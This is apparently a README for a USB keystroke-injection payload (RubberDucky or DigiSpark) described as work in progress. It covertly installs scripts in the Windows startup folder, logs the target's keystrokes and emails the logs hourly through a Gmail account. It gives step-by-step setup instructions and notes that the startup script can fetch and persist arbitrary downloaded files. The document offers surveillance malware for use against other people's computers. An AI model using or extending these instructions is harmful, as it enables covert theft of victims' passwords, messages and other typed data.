# WIP and still untested as of now!

# Overview:
- Downloads and moves c.cmd, p.ps1 and l.ps1 file to windows startup directory from web or PixelDrain
- *c.cmd* will secretly run p.ps1
- *p.ps1* will log keystrokes
- *l.ps1* will email the logs every startup and every hour [via SMTP]
  - sends logs hourly, regardless of system time
# Requirements:
 - ## For RubberDucky 
    - PixelDrain the files from the Dependancies folder or the same files uploaded to a website
    - Gmail account (google bad i know i know)
      - It needs [LSA Access](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4Px2VEFPoFPEuLutMD6UhNVRyY9P3s7l-pCGA53NBqilKVrtltrfS1823x5i6k6_pSEVp6jkEW0zKQT2CHN0WXh4fvGiw)
      - Personal suggesstion: Make a separate Gmail account for this payload alone
    - A Windows 10 (must be 10) target

- ## For DigiSpark (I'm not sure why I retyped this, but I sure did)
  - PixelDrain the files from the Dependancies folder or the same files uploaded to a website
    - Gmail account (google bad i know i know)
      - It needs [LSA Access](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4Px2VEFPoFPEuLutMD6UhNVRyY9P3s7l-pCGA53NBqilKVrtltrfS1823x5i6k6_pSEVp6jkEW0zKQT2CHN0WXh4fvGiw)
      - Personal suggesstion: Make a separate Gmail account for this payload alone
  - A Windows 10 target

 # Instructions
  - Enable LSA Access to your Gmail account
  - Upload all three of the files in the Dependancies folder to PixelDrain or onto a website directory.
  - Change the Gmail credidentials in *p.ps1*
- ```
  # gmail credentials
  $email = "example@gmail.com"
  $password = "password"

  ```
  - Load these to your DigiSpark or RubberDucky, and you're all set! Enjoy!
-# And please don't cause damage!
# Additional info:
```
The c.cmd file runs every startup.
This means an attacker could place a
'wget' or 'Invoke-WebRequest' and have a file
be downloaded from anywhere on the internet onto the computer.
The file would then save in the startup directory,
allowing it to run every startup.
```
